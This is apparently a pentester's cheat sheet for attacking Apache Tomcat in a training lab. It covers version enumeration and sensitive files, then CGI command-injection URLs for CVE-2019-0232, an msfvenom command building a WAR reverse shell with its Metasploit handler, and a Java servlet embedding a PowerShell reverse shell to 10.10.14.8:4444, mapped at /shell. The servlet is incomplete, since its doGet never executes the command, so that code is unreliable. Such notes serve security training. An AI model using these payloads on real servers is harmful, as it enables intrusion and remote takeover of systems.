Tomcat (TCP/8080)

Apache Tomcat is a free and open-source web server and servlet container that is primarily used to host Java-based web applications

Enumeration

    Version identification

      An easy way of identifying tomcat version is by request a page which does not exists for example

      http://app-dev.inlanefreight.local:8080/invalid

      This way the version number will be printed at the bottom of the page

      Another way of identifying is by requesting the /docs page which may have been deleted by administrators or not. Here is a list of important folder to checkout if /docs is still intact

      /conf #Stores configuration files used by tomcat
/bin #Stores scripts and binaries to start and run Tomcat Server
/lib #Stores various JAR files needed for the correct functioning of tomcat
/logs #Stores temporary log files
/temp #Stores temporary log files
/webapps #Default webroot  of Tomcat and hosts all applications
/work #Acts as a cache and is used to store data during runtime

      The most important file is WEB-INF/web.xml which is know as the deployment descriptor. This stores information about the routes used by the application and the classes handling these routes. Here we can find interesting endpoints

      All compild classes used by the application should be stored in the WEB-INF/classes folder These classes might contain important business logic as well as sensitive information

      The jsp folder stores Jakarta Server Pages (JSP), formerly known as JavaServer Pages, which can be compared to PHP files on an Apache server.

      the tomcat-users.xml is used to enable or disable the /manager or host-manager and in this file we can even find the username and password to access

Exploitation

    CGI scripts

      CGI scripts in tomcat can be found in the /cgi /cgi-bin folder. Those scripts normally require parameters in order of being used and normally are not very well secured. the CVE-2019-0232 is related since there was a CGI scripts that could be enabled by setting the option enableCmdLineArguments which lead to RCE

      Identify them by using dirb or others. Extensions type could be. Windows: .cgi .bat. cmd .exe .pl .py .cgi | Linux: .cgi .pl .py .sh .cgi

      IMPORTANT!! it might be possible that you find out a 404 when browsing the folder but that does not mean that it not exists. Said that attempt to perform the dir brute using http://IP:8080/cgi/FUZZ

      Once identifyed you batch or cmd file pass a parameter and check if it executes

      http://10.129.205.30:8080/cgi/welcome.bat?&dir

      In case other commands do not work it is possible that the PATH is not set so you need to specify absolute path. Check if path is set by using

      http://10.129.205.30:8080/cgi/welcome.bat?&set

      An example could be

      http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe

      And even the case the server returns an error you should try to encode it

      http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe

    Creating a .war using msfvenom

      Use the following command in order to create a .war which will contain a rever shell

      msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

      Then upload use the following metasploit module in order to catch the connection

      use exploit/multi/handler
set payload java/jsp_shell_reverse_tcp

      Finally access the file through the webserver and catch the connection back to your attacking server

    import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;

public class ShellServlet extends HttpServlet {
    public void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String[] cmd = {"cmd.exe", "/c", "powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.8',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""};

}

    web.xml

    <web-app>
    
    <servlet>
    
        <servlet-name>ShellServlet</servlet-name>
    
        <servlet-class>ShellServlet</servlet-class>
    
    </servlet>
    
    <servlet-mapping>
    
        <servlet-name>ShellServlet</servlet-name>
    
        <url-pattern>/shell</url-pattern>
    
    </servlet-mapping>
    
</web-app>
